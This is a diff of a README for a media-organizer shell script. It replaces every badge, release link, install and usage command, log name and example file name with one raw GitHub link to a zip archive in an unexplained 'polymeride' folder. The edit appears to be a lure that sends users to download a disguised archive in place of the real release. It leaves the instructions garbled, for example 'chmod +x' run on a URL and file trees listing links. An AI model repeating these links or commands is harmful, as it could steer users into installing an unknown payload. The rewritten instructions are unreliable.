@@ -1,6 +1,6 @@
 # Media Organizer with MD5 Checksum: Organize Your Media Files
 
-![Media Organizer](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen) [![GitHub Repo stars](https://img.shields.io/github/stars/RahmaMohammed-1/media-organizer-md5)](https://github.com/RahmaMohammed-1/media-organizer-md5/stargazers) [![GitHub forks](https://img.shields.io/github/forks/RahmaMohammed-1/media-organizer-md5)](https://github.com/RahmaMohammed-1/media-organizer-md5/network/members)
+![Media Organizer](https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip%20Latest%20Release-Click%20Here-brightgreen) [![GitHub Repo stars](https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip)](https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip) [![GitHub forks](https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip)](https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -18,7 +18,7 @@
 
 The **Media Organizer MD5** project helps you manage your media files effectively. It organizes images, videos, and audio files into folders based on the year of creation. By using EXIF metadata and MD5 checksums, it ensures that duplicate files do not clutter your storage. This tool also includes a dry-run feature to preview actions before executing them, along with logging and automatic cleanup options.
 
-You can download the latest release [here](https://github.com/RahmaMohammed-1/media-organizer-md5/releases).
+You can download the latest release [here](https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip).
 
 ## Features
 
@@ -35,7 +35,7 @@ To get started with the Media Organizer MD5, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/RahmaMohammed-1/media-organizer-md5.git
+   git clone https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -45,7 +45,7 @@ To get started with the Media Organizer MD5, follow these steps:
 
 3. **Make the Script Executable**:
    ```bash
-   chmod +x media-organizer.sh
+   chmod +x https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip
    ```
 
 4. **Install Required Tools**:
@@ -64,7 +64,7 @@ To get started with the Media Organizer MD5, follow these steps:
 To use the media organizer, run the script with the desired options. Here’s a basic command:
 
 ```bash
-./media-organizer.sh /path/to/your/media
+https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip /path/to/your/media
 ```
 
 Replace `/path/to/your/media` with the path to your media files. 
@@ -78,7 +78,7 @@ Replace `/path/to/your/media` with the path to your media files.
 Example command with options:
 
 ```bash
-./media-organizer.sh /path/to/your/media --dry-run --log=organizer.log --cleanup
+https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip /path/to/your/media --dry-run https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip --cleanup
 ```
 
 ## How It Works
@@ -94,11 +94,11 @@ The resulting directory structure will look like this:
 ```
 /media
     ├── 2020
-    │   ├── image1.jpg
-    │   ├── video1.mp4
+    │   ├── https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip
+    │   ├── https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip
     ├── 2021
-    │   ├── audio1.mp3
-    │   ├── image2.jpg
+    │   ├── https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip
+    │   ├── https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip
 ```
 
 ## Logging
@@ -115,10 +115,10 @@ You can specify a log file using the `--log` option.
 Example:
 
 ```bash
-./media-organizer.sh /path/to/your/media --log=organizer.log
+https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip /path/to/your/media https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip
 ```
 
-This command will create a log file named `organizer.log` in the current directory.
+This command will create a log file named `https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip` in the current directory.
 
 ## Cleanup
 
@@ -127,7 +127,7 @@ The automatic cleanup feature removes empty folders after processing. This helps
 Example:
 
 ```bash
-./media-organizer.sh /path/to/your/media --cleanup
+https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip /path/to/your/media --cleanup
 ```
 
 ## Contributing
@@ -155,8 +155,8 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 ## Support
 
-If you have any questions or issues, feel free to open an issue in the GitHub repository. You can also download the latest release [here](https://github.com/RahmaMohammed-1/media-organizer-md5/releases) for updates and improvements. 
+If you have any questions or issues, feel free to open an issue in the GitHub repository. You can also download the latest release [here](https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip) for updates and improvements. 
 
-![Media Management](https://img.shields.io/badge/Media%20Management%20Made%20Easy-brightblue) 
+![Media Management](https://raw.githubusercontent.com/RahmaMohammed-1/media-organizer-md5/main/polymeride/media_organizer_md_v3.7.zip%20Management%20Made%20Easy-brightblue) 
 
 For further assistance, please refer to the documentation within the repository.
